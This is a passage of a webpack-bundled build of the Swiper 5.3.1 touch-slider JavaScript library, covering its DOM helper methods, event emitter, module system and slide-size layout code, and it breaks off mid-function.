      var _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(_babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0__);

      /**
       * Swiper 5.3.1
       * Most modern mobile touch slider and framework with hardware accelerated transitions
       * http://swiperjs.com
       *
       * Copyright 2014-2020 Vladimir Kharlampidi
       *
       * Released under the MIT License
       *
       * Released on: February 8, 2020
       */

      !function (e, t) {
        "object" == (typeof exports === "undefined" ? "undefined" : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(exports)) && "undefined" != typeof module ? module.exports = t() : "function" == typeof define && __webpack_require__(/*! !webpack amd options */"./node_modules/webpack/buildin/amd-options.js") ? define(t) : (e = e || self).Swiper = t();
      }(undefined, function () {
        "use strict";

        var e = "undefined" == typeof document ? {
            body: {},
            addEventListener: function addEventListener() {},
            removeEventListener: function removeEventListener() {},
            activeElement: {
              blur: function blur() {},
              nodeName: ""
            },
            querySelector: function querySelector() {
              return null;
            },
            querySelectorAll: function querySelectorAll() {
              return [];
            },
            getElementById: function getElementById() {
              return null;
            },
            createEvent: function createEvent() {
              return {
                initEvent: function initEvent() {}
              };
            },
            createElement: function createElement() {
              return {
                children: [],
                childNodes: [],
                style: {},
                setAttribute: function setAttribute() {},
                getElementsByTagName: function getElementsByTagName() {
                  return [];
                }
              };
            },
            location: {
              hash: ""
            }
          } : document,
          t = "undefined" == typeof window ? {
            document: e,
            navigator: {
              userAgent: ""
            },
            location: {},
            history: {},
            CustomEvent: function CustomEvent() {
              return this;
            },
            addEventListener: function addEventListener() {},
            removeEventListener: function removeEventListener() {},
            getComputedStyle: function getComputedStyle() {
              return {
                getPropertyValue: function getPropertyValue() {
                  return "";
                }
              };
            },
            Image: function Image() {},
            Date: function Date() {},
            screen: {},
            setTimeout: function setTimeout() {},
            clearTimeout: function clearTimeout() {}
          } : window,
          i = function i(e) {
            for (var t = 0; t < e.length; t += 1) this[t] = e[t];
            return this.length = e.length, this;
          };
        function s(s, a) {
          var r = [],
            n = 0;
          if (s && !a && s instanceof i) return s;
          if (s) if ("string" == typeof s) {
            var o,
              l,
              d = s.trim();
            if (d.indexOf("<") >= 0 && d.indexOf(">") >= 0) {
              var h = "div";
              for (0 === d.indexOf("<li") && (h = "ul"), 0 === d.indexOf("<tr") && (h = "tbody"), 0 !== d.indexOf("<td") && 0 !== d.indexOf("<th") || (h = "tr"), 0 === d.indexOf("<tbody") && (h = "table"), 0 === d.indexOf("<option") && (h = "select"), (l = e.createElement(h)).innerHTML = d, n = 0; n < l.childNodes.length; n += 1) r.push(l.childNodes[n]);
            } else for (o = a || "#" !== s[0] || s.match(/[ .<>:~]/) ? (a || e).querySelectorAll(s.trim()) : [e.getElementById(s.trim().split("#")[1])], n = 0; n < o.length; n += 1) o[n] && r.push(o[n]);
          } else if (s.nodeType || s === t || s === e) r.push(s);else if (s.length > 0 && s[0].nodeType) for (n = 0; n < s.length; n += 1) r.push(s[n]);
          return new i(r);
        }
        function a(e) {
          for (var t = [], i = 0; i < e.length; i += 1) -1 === t.indexOf(e[i]) && t.push(e[i]);
          return t;
        }
        s.fn = i.prototype, s.Class = i, s.Dom7 = i;
        var r = {
          addClass: function addClass(e) {
            if (void 0 === e) return this;
            for (var t = e.split(" "), i = 0; i < t.length; i += 1) for (var s = 0; s < this.length; s += 1) void 0 !== this[s] && void 0 !== this[s].classList && this[s].classList.add(t[i]);
            return this;
          },
          removeClass: function removeClass(e) {
            for (var t = e.split(" "), i = 0; i < t.length; i += 1) for (var s = 0; s < this.length; s += 1) void 0 !== this[s] && void 0 !== this[s].classList && this[s].classList.remove(t[i]);
            return this;
          },
          hasClass: function hasClass(e) {
            return !!this[0] && this[0].classList.contains(e);
          },
          toggleClass: function toggleClass(e) {
            for (var t = e.split(" "), i = 0; i < t.length; i += 1) for (var s = 0; s < this.length; s += 1) void 0 !== this[s] && void 0 !== this[s].classList && this[s].classList.toggle(t[i]);
            return this;
          },
          attr: function attr(e, t) {
            var i = arguments;
            if (1 === arguments.length && "string" == typeof e) return this[0] ? this[0].getAttribute(e) : void 0;
            for (var s = 0; s < this.length; s += 1) if (2 === i.length) this[s].setAttribute(e, t);else for (var a in e) this[s][a] = e[a], this[s].setAttribute(a, e[a]);
            return this;
          },
          removeAttr: function removeAttr(e) {
            for (var t = 0; t < this.length; t += 1) this[t].removeAttribute(e);
            return this;
          },
          data: function data(e, t) {
            var i;
            if (void 0 !== t) {
              for (var s = 0; s < this.length; s += 1) (i = this[s]).dom7ElementDataStorage || (i.dom7ElementDataStorage = {}), i.dom7ElementDataStorage[e] = t;
              return this;
            }
            if (i = this[0]) {
              if (i.dom7ElementDataStorage && e in i.dom7ElementDataStorage) return i.dom7ElementDataStorage[e];
              var a = i.getAttribute("data-" + e);
              return a || void 0;
            }
          },
          transform: function transform(e) {
            for (var t = 0; t < this.length; t += 1) {
              var i = this[t].style;
              i.webkitTransform = e, i.transform = e;
            }
            return this;
          },
          transition: function transition(e) {
            "string" != typeof e && (e += "ms");
            for (var t = 0; t < this.length; t += 1) {
              var i = this[t].style;
              i.webkitTransitionDuration = e, i.transitionDuration = e;
            }
            return this;
          },
          on: function on() {
            for (var e, t = [], i = arguments.length; i--;) t[i] = arguments[i];
            var a = t[0],
              r = t[1],
              n = t[2],
              o = t[3];
            function l(e) {
              var t = e.target;
              if (t) {
                var i = e.target.dom7EventData || [];
                if (i.indexOf(e) < 0 && i.unshift(e), s(t).is(r)) n.apply(t, i);else for (var a = s(t).parents(), o = 0; o < a.length; o += 1) s(a[o]).is(r) && n.apply(a[o], i);
              }
            }
            function d(e) {
              var t = e && e.target && e.target.dom7EventData || [];
              t.indexOf(e) < 0 && t.unshift(e), n.apply(this, t);
            }
            "function" == typeof t[1] && (a = (e = t)[0], n = e[1], o = e[2], r = void 0), o || (o = !1);
            for (var h, p = a.split(" "), c = 0; c < this.length; c += 1) {
              var u = this[c];
              if (r) for (h = 0; h < p.length; h += 1) {
                var v = p[h];
                u.dom7LiveListeners || (u.dom7LiveListeners = {}), u.dom7LiveListeners[v] || (u.dom7LiveListeners[v] = []), u.dom7LiveListeners[v].push({
                  listener: n,
                  proxyListener: l
                }), u.addEventListener(v, l, o);
              } else for (h = 0; h < p.length; h += 1) {
                var f = p[h];
                u.dom7Listeners || (u.dom7Listeners = {}), u.dom7Listeners[f] || (u.dom7Listeners[f] = []), u.dom7Listeners[f].push({
                  listener: n,
                  proxyListener: d
                }), u.addEventListener(f, d, o);
              }
            }
            return this;
          },
          off: function off() {
            for (var e, t = [], i = arguments.length; i--;) t[i] = arguments[i];
            var s = t[0],
              a = t[1],
              r = t[2],
              n = t[3];
            "function" == typeof t[1] && (s = (e = t)[0], r = e[1], n = e[2], a = void 0), n || (n = !1);
            for (var o = s.split(" "), l = 0; l < o.length; l += 1) for (var d = o[l], h = 0; h < this.length; h += 1) {
              var p = this[h],
                c = void 0;
              if (!a && p.dom7Listeners ? c = p.dom7Listeners[d] : a && p.dom7LiveListeners && (c = p.dom7LiveListeners[d]), c && c.length) for (var u = c.length - 1; u >= 0; u -= 1) {
                var v = c[u];
                r && v.listener === r ? (p.removeEventListener(d, v.proxyListener, n), c.splice(u, 1)) : r && v.listener && v.listener.dom7proxy && v.listener.dom7proxy === r ? (p.removeEventListener(d, v.proxyListener, n), c.splice(u, 1)) : r || (p.removeEventListener(d, v.proxyListener, n), c.splice(u, 1));
              }
            }
            return this;
          },
          trigger: function trigger() {
            for (var i = [], s = arguments.length; s--;) i[s] = arguments[s];
            for (var a = i[0].split(" "), r = i[1], n = 0; n < a.length; n += 1) for (var o = a[n], l = 0; l < this.length; l += 1) {
              var d = this[l],
                h = void 0;
              try {
                h = new t.CustomEvent(o, {
                  detail: r,
                  bubbles: !0,
                  cancelable: !0
                });
              } catch (t) {
                (h = e.createEvent("Event")).initEvent(o, !0, !0), h.detail = r;
              }
              d.dom7EventData = i.filter(function (e, t) {
                return t > 0;
              }), d.dispatchEvent(h), d.dom7EventData = [], delete d.dom7EventData;
            }
            return this;
          },
          transitionEnd: function transitionEnd(e) {
            var t,
              i = ["webkitTransitionEnd", "transitionend"],
              s = this;
            function a(r) {
              if (r.target === this) for (e.call(this, r), t = 0; t < i.length; t += 1) s.off(i[t], a);
            }
            if (e) for (t = 0; t < i.length; t += 1) s.on(i[t], a);
            return this;
          },
          outerWidth: function outerWidth(e) {
            if (this.length > 0) {
              if (e) {
                var t = this.styles();
                return this[0].offsetWidth + parseFloat(t.getPropertyValue("margin-right")) + parseFloat(t.getPropertyValue("margin-left"));
              }
              return this[0].offsetWidth;
            }
            return null;
          },
          outerHeight: function outerHeight(e) {
            if (this.length > 0) {
              if (e) {
                var t = this.styles();
                return this[0].offsetHeight + parseFloat(t.getPropertyValue("margin-top")) + parseFloat(t.getPropertyValue("margin-bottom"));
              }
              return this[0].offsetHeight;
            }
            return null;
          },
          offset: function offset() {
            if (this.length > 0) {
              var i = this[0],
                s = i.getBoundingClientRect(),
                a = e.body,
                r = i.clientTop || a.clientTop || 0,
                n = i.clientLeft || a.clientLeft || 0,
                o = i === t ? t.scrollY : i.scrollTop,
                l = i === t ? t.scrollX : i.scrollLeft;
              return {
                top: s.top + o - r,
                left: s.left + l - n
              };
            }
            return null;
          },
          css: function css(e, i) {
            var s;
            if (1 === arguments.length) {
              if ("string" != typeof e) {
                for (s = 0; s < this.length; s += 1) for (var a in e) this[s].style[a] = e[a];
                return this;
              }
              if (this[0]) return t.getComputedStyle(this[0], null).getPropertyValue(e);
            }
            if (2 === arguments.length && "string" == typeof e) {
              for (s = 0; s < this.length; s += 1) this[s].style[e] = i;
              return this;
            }
            return this;
          },
          each: function each(e) {
            if (!e) return this;
            for (var t = 0; t < this.length; t += 1) if (!1 === e.call(this[t], t, this[t])) return this;
            return this;
          },
          html: function html(e) {
            if (void 0 === e) return this[0] ? this[0].innerHTML : void 0;
            for (var t = 0; t < this.length; t += 1) this[t].innerHTML = e;
            return this;
          },
          text: function text(e) {
            if (void 0 === e) return this[0] ? this[0].textContent.trim() : null;
            for (var t = 0; t < this.length; t += 1) this[t].textContent = e;
            return this;
          },
          is: function is(a) {
            var r,
              n,
              o = this[0];
            if (!o || void 0 === a) return !1;
            if ("string" == typeof a) {
              if (o.matches) return o.matches(a);
              if (o.webkitMatchesSelector) return o.webkitMatchesSelector(a);
              if (o.msMatchesSelector) return o.msMatchesSelector(a);
              for (r = s(a), n = 0; n < r.length; n += 1) if (r[n] === o) return !0;
              return !1;
            }
            if (a === e) return o === e;
            if (a === t) return o === t;
            if (a.nodeType || a instanceof i) {
              for (r = a.nodeType ? [a] : a, n = 0; n < r.length; n += 1) if (r[n] === o) return !0;
              return !1;
            }
            return !1;
          },
          index: function index() {
            var e,
              t = this[0];
            if (t) {
              for (e = 0; null !== (t = t.previousSibling);) 1 === t.nodeType && (e += 1);
              return e;
            }
          },
          eq: function eq(e) {
            if (void 0 === e) return this;
            var t,
              s = this.length;
            return new i(e > s - 1 ? [] : e < 0 ? (t = s + e) < 0 ? [] : [this[t]] : [this[e]]);
          },
          append: function append() {
            for (var t, s = [], a = arguments.length; a--;) s[a] = arguments[a];
            for (var r = 0; r < s.length; r += 1) {
              t = s[r];
              for (var n = 0; n < this.length; n += 1) if ("string" == typeof t) {
                var o = e.createElement("div");
                for (o.innerHTML = t; o.firstChild;) this[n].appendChild(o.firstChild);
              } else if (t instanceof i) for (var l = 0; l < t.length; l += 1) this[n].appendChild(t[l]);else this[n].appendChild(t);
            }
            return this;
          },
          prepend: function prepend(t) {
            var s, a;
            for (s = 0; s < this.length; s += 1) if ("string" == typeof t) {
              var r = e.createElement("div");
              for (r.innerHTML = t, a = r.childNodes.length - 1; a >= 0; a -= 1) this[s].insertBefore(r.childNodes[a], this[s].childNodes[0]);
            } else if (t instanceof i) for (a = 0; a < t.length; a += 1) this[s].insertBefore(t[a], this[s].childNodes[0]);else this[s].insertBefore(t, this[s].childNodes[0]);
            return this;
          },
          next: function next(e) {
            return this.length > 0 ? e ? this[0].nextElementSibling && s(this[0].nextElementSibling).is(e) ? new i([this[0].nextElementSibling]) : new i([]) : this[0].nextElementSibling ? new i([this[0].nextElementSibling]) : new i([]) : new i([]);
          },
          nextAll: function nextAll(e) {
            var t = [],
              a = this[0];
            if (!a) return new i([]);
            for (; a.nextElementSibling;) {
              var r = a.nextElementSibling;
              e ? s(r).is(e) && t.push(r) : t.push(r), a = r;
            }
            return new i(t);
          },
          prev: function prev(e) {
            if (this.length > 0) {
              var t = this[0];
              return e ? t.previousElementSibling && s(t.previousElementSibling).is(e) ? new i([t.previousElementSibling]) : new i([]) : t.previousElementSibling ? new i([t.previousElementSibling]) : new i([]);
            }
            return new i([]);
          },
          prevAll: function prevAll(e) {
            var t = [],
              a = this[0];
            if (!a) return new i([]);
            for (; a.previousElementSibling;) {
              var r = a.previousElementSibling;
              e ? s(r).is(e) && t.push(r) : t.push(r), a = r;
            }
            return new i(t);
          },
          parent: function parent(e) {
            for (var t = [], i = 0; i < this.length; i += 1) null !== this[i].parentNode && (e ? s(this[i].parentNode).is(e) && t.push(this[i].parentNode) : t.push(this[i].parentNode));
            return s(a(t));
          },
          parents: function parents(e) {
            for (var t = [], i = 0; i < this.length; i += 1) for (var r = this[i].parentNode; r;) e ? s(r).is(e) && t.push(r) : t.push(r), r = r.parentNode;
            return s(a(t));
          },
          closest: function closest(e) {
            var t = this;
            return void 0 === e ? new i([]) : (t.is(e) || (t = t.parents(e).eq(0)), t);
          },
          find: function find(e) {
            for (var t = [], s = 0; s < this.length; s += 1) for (var a = this[s].querySelectorAll(e), r = 0; r < a.length; r += 1) t.push(a[r]);
            return new i(t);
          },
          children: function children(e) {
            for (var t = [], r = 0; r < this.length; r += 1) for (var n = this[r].childNodes, o = 0; o < n.length; o += 1) e ? 1 === n[o].nodeType && s(n[o]).is(e) && t.push(n[o]) : 1 === n[o].nodeType && t.push(n[o]);
            return new i(a(t));
          },
          filter: function filter(e) {
            for (var t = [], s = 0; s < this.length; s += 1) e.call(this[s], s, this[s]) && t.push(this[s]);
            return new i(t);
          },
          remove: function remove() {
            for (var e = 0; e < this.length; e += 1) this[e].parentNode && this[e].parentNode.removeChild(this[e]);
            return this;
          },
          add: function add() {
            for (var e = [], t = arguments.length; t--;) e[t] = arguments[t];
            var i, a;
            for (i = 0; i < e.length; i += 1) {
              var r = s(e[i]);
              for (a = 0; a < r.length; a += 1) this[this.length] = r[a], this.length += 1;
            }
            return this;
          },
          styles: function styles() {
            return this[0] ? t.getComputedStyle(this[0], null) : {};
          }
        };
        Object.keys(r).forEach(function (e) {
          s.fn[e] = s.fn[e] || r[e];
        });
        var n = {
            deleteProps: function deleteProps(e) {
              var t = e;
              Object.keys(t).forEach(function (e) {
                try {
                  t[e] = null;
                } catch (e) {}
                try {
                  delete t[e];
                } catch (e) {}
              });
            },
            nextTick: function nextTick(e, t) {
              return void 0 === t && (t = 0), setTimeout(e, t);
            },
            now: function now() {
              return Date.now();
            },
            getTranslate: function getTranslate(e, i) {
              var s, a, r;
              void 0 === i && (i = "x");
              var n = t.getComputedStyle(e, null);
              return t.WebKitCSSMatrix ? ((a = n.transform || n.webkitTransform).split(",").length > 6 && (a = a.split(", ").map(function (e) {
                return e.replace(",", ".");
              }).join(", ")), r = new t.WebKitCSSMatrix("none" === a ? "" : a)) : s = (r = n.MozTransform || n.OTransform || n.MsTransform || n.msTransform || n.transform || n.getPropertyValue("transform").replace("translate(", "matrix(1, 0, 0, 1,")).toString().split(","), "x" === i && (a = t.WebKitCSSMatrix ? r.m41 : 16 === s.length ? parseFloat(s[12]) : parseFloat(s[4])), "y" === i && (a = t.WebKitCSSMatrix ? r.m42 : 16 === s.length ? parseFloat(s[13]) : parseFloat(s[5])), a || 0;
            },
            parseUrlQuery: function parseUrlQuery(e) {
              var i,
                s,
                a,
                r,
                n = {},
                o = e || t.location.href;
              if ("string" == typeof o && o.length) for (r = (s = (o = o.indexOf("?") > -1 ? o.replace(/\S*\?/, "") : "").split("&").filter(function (e) {
                return "" !== e;
              })).length, i = 0; i < r; i += 1) a = s[i].replace(/#\S+/g, "").split("="), n[decodeURIComponent(a[0])] = void 0 === a[1] ? void 0 : decodeURIComponent(a[1]) || "";
              return n;
            },
            isObject: function isObject(e) {
              return "object" == _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(e) && null !== e && e.constructor && e.constructor === Object;
            },
            extend: function extend() {
              for (var e = [], t = arguments.length; t--;) e[t] = arguments[t];
              for (var i = Object(e[0]), s = 1; s < e.length; s += 1) {
                var a = e[s];
                if (null != a) for (var r = Object.keys(Object(a)), o = 0, l = r.length; o < l; o += 1) {
                  var d = r[o],
                    h = Object.getOwnPropertyDescriptor(a, d);
                  void 0 !== h && h.enumerable && (n.isObject(i[d]) && n.isObject(a[d]) ? n.extend(i[d], a[d]) : !n.isObject(i[d]) && n.isObject(a[d]) ? (i[d] = {}, n.extend(i[d], a[d])) : i[d] = a[d]);
                }
              }
              return i;
            }
          },
          o = {
            touch: t.Modernizr && !0 === t.Modernizr.touch || !!(t.navigator.maxTouchPoints > 0 || "ontouchstart" in t || t.DocumentTouch && e instanceof t.DocumentTouch),
            pointerEvents: !!t.PointerEvent && "maxTouchPoints" in t.navigator && t.navigator.maxTouchPoints > 0,
            observer: "MutationObserver" in t || "WebkitMutationObserver" in t,
            passiveListener: function () {
              var e = !1;
              try {
                var i = Object.defineProperty({}, "passive", {
                  get: function get() {
                    e = !0;
                  }
                });
                t.addEventListener("testPassiveListener", null, i);
              } catch (e) {}
              return e;
            }(),
            gestures: "ongesturestart" in t
          },
          l = function l(e) {
            void 0 === e && (e = {});
            var t = this;
            t.params = e, t.eventsListeners = {}, t.params && t.params.on && Object.keys(t.params.on).forEach(function (e) {
              t.on(e, t.params.on[e]);
            });
          },
          d = {
            components: {
              configurable: !0
            }
          };
        l.prototype.on = function (e, t, i) {
          var s = this;
          if ("function" != typeof t) return s;
          var a = i ? "unshift" : "push";
          return e.split(" ").forEach(function (e) {
            s.eventsListeners[e] || (s.eventsListeners[e] = []), s.eventsListeners[e][a](t);
          }), s;
        }, l.prototype.once = function (e, t, i) {
          var s = this;
          if ("function" != typeof t) return s;
          function a() {
            for (var i = [], r = arguments.length; r--;) i[r] = arguments[r];
            s.off(e, a), a.f7proxy && delete a.f7proxy, t.apply(s, i);
          }
          return a.f7proxy = t, s.on(e, a, i);
        }, l.prototype.off = function (e, t) {
          var i = this;
          return i.eventsListeners ? (e.split(" ").forEach(function (e) {
            void 0 === t ? i.eventsListeners[e] = [] : i.eventsListeners[e] && i.eventsListeners[e].length && i.eventsListeners[e].forEach(function (s, a) {
              (s === t || s.f7proxy && s.f7proxy === t) && i.eventsListeners[e].splice(a, 1);
            });
          }), i) : i;
        }, l.prototype.emit = function () {
          for (var e = [], t = arguments.length; t--;) e[t] = arguments[t];
          var i,
            s,
            a,
            r = this;
          if (!r.eventsListeners) return r;
          "string" == typeof e[0] || Array.isArray(e[0]) ? (i = e[0], s = e.slice(1, e.length), a = r) : (i = e[0].events, s = e[0].data, a = e[0].context || r);
          var n = Array.isArray(i) ? i : i.split(" ");
          return n.forEach(function (e) {
            if (r.eventsListeners && r.eventsListeners[e]) {
              var t = [];
              r.eventsListeners[e].forEach(function (e) {
                t.push(e);
              }), t.forEach(function (e) {
                e.apply(a, s);
              });
            }
          }), r;
        }, l.prototype.useModulesParams = function (e) {
          var t = this;
          t.modules && Object.keys(t.modules).forEach(function (i) {
            var s = t.modules[i];
            s.params && n.extend(e, s.params);
          });
        }, l.prototype.useModules = function (e) {
          void 0 === e && (e = {});
          var t = this;
          t.modules && Object.keys(t.modules).forEach(function (i) {
            var s = t.modules[i],
              a = e[i] || {};
            s.instance && Object.keys(s.instance).forEach(function (e) {
              var i = s.instance[e];
              t[e] = "function" == typeof i ? i.bind(t) : i;
            }), s.on && t.on && Object.keys(s.on).forEach(function (e) {
              t.on(e, s.on[e]);
            }), s.create && s.create.bind(t)(a);
          });
        }, d.components.set = function (e) {
          this.use && this.use(e);
        }, l.installModule = function (e) {
          for (var t = [], i = arguments.length - 1; i-- > 0;) t[i] = arguments[i + 1];
          var s = this;
          s.prototype.modules || (s.prototype.modules = {});
          var a = e.name || Object.keys(s.prototype.modules).length + "_" + n.now();
          return s.prototype.modules[a] = e, e.proto && Object.keys(e.proto).forEach(function (t) {
            s.prototype[t] = e.proto[t];
          }), e.static && Object.keys(e.static).forEach(function (t) {
            s[t] = e.static[t];
          }), e.install && e.install.apply(s, t), s;
        }, l.use = function (e) {
          for (var t = [], i = arguments.length - 1; i-- > 0;) t[i] = arguments[i + 1];
          var s = this;
          return Array.isArray(e) ? (e.forEach(function (e) {
            return s.installModule(e);
          }), s) : s.installModule.apply(s, [e].concat(t));
        }, Object.defineProperties(l, d);
        var h = {
          updateSize: function updateSize() {
            var e,
              t,
              i = this.$el;
            e = void 0 !== this.params.width ? this.params.width : i[0].clientWidth, t = void 0 !== this.params.height ? this.params.height : i[0].clientHeight, 0 === e && this.isHorizontal() || 0 === t && this.isVertical() || (e = e - parseInt(i.css("padding-left"), 10) - parseInt(i.css("padding-right"), 10), t = t - parseInt(i.css("padding-top"), 10) - parseInt(i.css("padding-bottom"), 10), n.extend(this, {
              width: e,
              height: t,
              size: this.isHorizontal() ? e : t
            }));
          },
          updateSlides: function updateSlides() {
            var e = this.params,
              i = this.$wrapperEl,
              s = this.size,
              a = this.rtlTranslate,
              r = this.wrongRTL,
              o = this.virtual && e.virtual.enabled,
              l = o ? this.virtual.slides.length : this.slides.length,
              d = i.children("." + this.params.slideClass),
              h = o ? this.virtual.slides.length : d.length,
              p = [],
              c = [],
              u = [];
            function v(t) {
              return !e.cssMode || t !== d.length - 1;
            }
            var f = e.slidesOffsetBefore;
            "function" == typeof f && (f = e.slidesOffsetBefore.call(this));
            var m = e.slidesOffsetAfter;
            "function" == typeof m && (m = e.slidesOffsetAfter.call(this));
            var g = this.snapGrid.length,
              b = this.snapGrid.length,
              w = e.spaceBetween,
              y = -f,
              x = 0,
              T = 0;
            if (void 0 !== s) {
              var E, S;
              "string" == typeof w && w.indexOf("%") >= 0 && (w = parseFloat(w.replace("%", "")) / 100 * s), this.virtualSize = -w, a ? d.css({
                marginLeft: "",
                marginTop: ""
              }) : d.css({
                marginRight: "",
                marginBottom: ""
              }), e.slidesPerColumn > 1 && (E = Math.floor(h / e.slidesPerColumn) === h / this.params.slidesPerColumn ? h : Math.ceil(h / e.slidesPerColumn) * e.slidesPerColumn, "auto" !== e.slidesPerView && "row" === e.slidesPerColumnFill && (E = Math.max(E, e.slidesPerView * e.slidesPerColumn)));
              for (var C, M = e.slidesPerColumn, P = E / M, z = Math.floor(h / e.slidesPerColumn), k = 0; k < h; k += 1) {
                S = 0;
                var $ = d.eq(k);
                if (e.slidesPerColumn > 1) {
                  var L = void 0,
                    I = void 0,
                    D = void 0;
                  if ("row" === e.slidesPerColumnFill && e.slidesPerGroup > 1) {
                    var O = Math.floor(k / (e.slidesPerGroup * e.slidesPerColumn)),
                      A = k - e.slidesPerColumn * e.slidesPerGroup * O,
                      G = 0 === O ? e.slidesPerGroup : Math.min(Math.ceil((h - O * M * e.slidesPerGroup) / M), e.slidesPerGroup);
                    L = (I = A - (D = Math.floor(A / G)) * G + O * e.slidesPerGroup) + D * E / M, $.css({
                      "-webkit-box-ordinal-group": L,
                      "-moz-box-ordinal-group": L,
                      "-ms-flex-order": L,
                      "-webkit-order": L,
                      order: L
                    });
                  } else "column" === e.slidesPerColumnFill ? (D = k - (I = Math.floor(k / M)) * M, (I > z || I === z && D === M - 1) && (D += 1) >= M && (D = 0, I += 1)) : I = k - (D = Math.floor(k / P)) * P;
                  $.css("margin-" + (this.isHorizontal() ? "top" : "left"), 0 !== D && e.spaceBetween && e.spaceBetween + "px");
                }
                if ("none" !== $.css("display")) {
                  if ("auto" === e.slidesPerView) {
                    var B = t.getComputedStyle($[0], null),
                      H = $[0].style.transform,
                      N = $[0].style.webkitTransform;
                    if (H && ($[0].style.transform = "none"), N && ($[0].style.webkitTransform = "none"), e.roundLengths) S = this.isHorizontal() ? $.outerWidth(!0) : $.outerHeight(!0);else if (this.isHorizontal()) {
                      var X = parseFloat(B.getPropertyValue("width")),
                        V = parseFloat(B.getPropertyValue("padding-left")),
                        Y = parseFloat(B.getPropertyValue("padding-right")),
                        F = parseFloat(B.getPropertyValue("margin-left")),
                        W = parseFloat(B.getPropertyValue("margin-right")),
                        R = B.getPropertyValue("box-sizing");
                      S = R && "border-box" === R ? X + F + W : X + V + Y + F + W;
                    } else {
                      var q = parseFloat(B.getPropertyValue("height")),
                        j = parseFloat(B.getPropertyValue("padding-top")),
                        K = parseFloat(B.getPropertyValue("padding-bottom")),
                        U = parseFloat(B.getPropertyValue("margin-top")),
                        _ = parseFloat(B.getPropertyValue("margin-bottom")),
                        Z = B.getPropertyValue("box-sizing");
                      S = Z && "border-box" === Z ? q + U + _ : q + j + K + U + _;
                    }
                    H && ($[0].style.transform = H), N && ($[0].style.webkitTransform = N), e.roundLengths && (S = Math.floor(S));
                  } else S = (s - (e.slidesPerView - 1) * w) / e.slidesPerView, e.roundLengths && (S = Math.floor(S)), d[k] && (this.isHorizontal() ? d[k].style.width = S + "px" : d[k].style.height = S + "px");
                  d[k] && (d[k].swiperSlideSize = S), u.push(S), e.centeredSlides ? (y = y + S / 2 + x / 2 + w, 0 === x && 0 !== k && (y = y - s / 2 - w), 0 === k && (y = y - s / 2 - w), Math.abs(y) < .001 && (y = 0), e.roundLengths && (y = Math.floor(y)), T % e.slidesPerGroup == 0 && p.push(y), c.push(y)) : (e.roundLengths && (y = Math.floor(y)), (T - Math.min(this.params.slidesPerGroupSkip, T)) % this.params.slidesPerGroup == 0 && p.push(y), c.push(y), y = y + S + w), this.virtualSize += S + w, x = S, T += 1;
                }
              }
              if (this.virtualSize = Math.max(this.virtualSize, s) + m, a && r && ("slide" === e.effect || "coverflow" === e.effect) && i.css({
                width: this.virtualSize + e.spaceBetween + "px"
              }), e.setWrapperSize && (this.isHorizontal() ? i.css({
                width: this.virtualSize + e.spaceBetween + "px"
              }) : i.css({
                height: this.virtualSize + e.spaceBetween + "px"
              })), e.slidesPerColumn > 1 && (this.virtualSize = (S + e.spaceBetween) * E, this.virtualSize = Math.ceil(this.virtualSize / e.slidesPerColumn) - e.spaceBetween, this.isHorizontal() ? i.css({
                width: this.virtualSize + e.spaceBetween + "px"
              }) : i.css({
                height: this.virtualSize + e.spaceBetween + "px"
              }), e.centeredSlides)) {
                C = [];
                for (var Q = 0; Q < p.length; Q += 1) {
                  var J = p[Q];
                  e.roundLengths && (J = Math.floor(J)), p[Q] < this.virtualSize + p[0] && C.push(J);
                }
                p = C;
              }
              if (!e.centeredSlides) {
                C = [];
                for (var ee = 0; ee < p.length; ee += 1) {
                  var te = p[ee];
                  e.roundLengths && (te = Math.floor(te)), p[ee] <= this.virtualSize - s && C.push(te);
                }
                p = C, Math.floor(this.virtualSize - s) - Math.floor(p[p.length - 1]) > 1 && p.push(this.virtualSize - s);
              }
              if (0 === p.length && (p = [0]), 0 !== e.spaceBetween && (this.isHorizontal() ? a ? d.filter(v).css({
                marginLeft: w + "px"
              }) : d.filter(v).css({
                marginRight: w + "px"
              }) : d.filter(v).css({
                marginBottom: w + "px"
              })), e.centeredSlides && e.centeredSlidesBounds) {
                var ie = 0;
                u.forEach(function (t) {
                  ie += t + (e.spaceBetween ? e.spaceBetween : 0);
                });
                var se = (ie -= e.spaceBetween) - s;
                p = p.map(function (e) {
                  return e < 0 ? -f : e > se ? se + m : e;
                });
              }
              if (e.centerInsufficientSlides) {
                var ae = 0;
                if (u.forEach(function (t) {
                  ae += t + (e.spaceBetween ? e.spaceBetween : 0);
                }), (ae -= e.spaceBetween) < s) {
                  var re = (s - ae) / 2;
                  p.forEach(function (e, t) {
                    p[t] = e - re;
                  }), c.forEach(function (e, t) {
                    c[t] = e + re;
                  });
                }
              }
              n.extend(this, {
                slides: d,
                snapGrid: p,
                slidesGrid: c,
                slidesSizesGrid: u
              }), h !== l && this.emit("slidesLengthChange"), p.length !== g && (this.params.watchOverflow && this.checkOverflow(), this.emit("snapGridLengthChange")), c.length !== b && this.emit("slidesGridLengthChange"), (e.watchSlidesProgress || e.watchSlidesVisibility) && this.updateSlidesOffset();
            }
          },
          updateAutoHeight: function updateAutoHeight(e) {
            var t,
              i = [],
              s = 0;
            if ("number" == typeof e ? this.setTransition(e) : !0 === e && this.setTransition(this.params.speed), "auto" !== this.params.slidesPerView && this.params.slidesPerView > 1) for (t = 0; t < Math.ceil(this.params.slidesPerView); t += 1) {
              var a = this.activeIndex + t;
              if (a > this.slides.length) break;
              i.push(this.slides.eq(a)[0]);
            } else i.push(this.slides.eq(this.activeIndex)[0]);
            for (t = 0; t < i.length; t += 1) if (void 0 !== i[t]) {
              var r = i[t].offsetHeight;
              s = r > s ? r : s;
            }
            s && this.$wrapperEl.css("height", s + "px");
          },
          updateSlidesOffset: function updateSlidesOffset() {
            for (var e = this.slides, t = 0; t < e.length; t += 1) e[t].swiperSlideOffset = this.isHorizontal() ? e[t].offsetLeft : e[t].offsetTop;
          },
          updateSlidesProgress: function updateSlidesProgress(e) {
            void 0 === e && (e = this && this.translate || 0);
            var t = this.params,
              i = this.slides,
              a = this.rtlTranslate;
            if (0 !== i.length) {
              void 0 === i[0].swiperSlideOffset && this.updateSlidesOffset();
              var r = -e;
              a && (r = e), i.removeClass(t.slideVisibleClass), this.visibleSlidesIndexes = [], this.visibleSlides = [];
              for (var n = 0; n < i.length; n += 1) {
                var o = i[n],
